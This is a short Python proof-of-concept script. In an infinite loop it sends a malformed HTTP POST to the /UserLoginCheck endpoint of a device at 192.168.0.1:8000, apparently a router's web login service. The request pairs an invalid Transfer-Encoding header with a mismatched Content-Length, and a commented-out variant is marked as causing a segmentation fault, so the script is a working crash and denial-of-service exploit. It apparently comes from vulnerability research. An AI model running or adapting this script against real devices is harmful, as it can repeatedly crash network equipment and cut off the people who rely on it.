import socket
import struct
import time
import random


# another segv:
# request = (
# 	b"POST /UserLoginCheck HTTP/1.1\r\n" +
# 	b"Host: aaa\r\n" +
# 	b"Transfer-Encoding: aasa\r\n" +
# 	b"Content-Length: 40\r\n" +
# 	b"Content-Type: application/json\r\n" +
# 	b"\r\n" +
# 	b"{\"Input_Account\":\"aaa\",\"Input_Passwd\":\"bbb\"}\r\n" +
# 	b"\r\n\r\n"
# )




HOST = '192.168.0.1'
PORT = 8000

request = (
	b"POST /UserLoginCheck HTTP/1.0\r\n" +
	b"Host: aaa\r\n" +
	b"Transfer-Encoding: aasa\r\n" +
	b"Content-Length: 1\r\n" +
	b"Content-Type: application/x-www-form-urlencoded\r\n" +
	b"\r\n" +
	b"{\"Input_Account\":\"aaa\",\"Input_Passwd\":\"bbb\"}\r\n"
	b"aaa\r\n"
)

while True:
	print(f"sending data:\n{request.decode('ascii')}")

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))
	s.send(request)
	# res = s.recv(4096)
	# print(res)
	s.close()
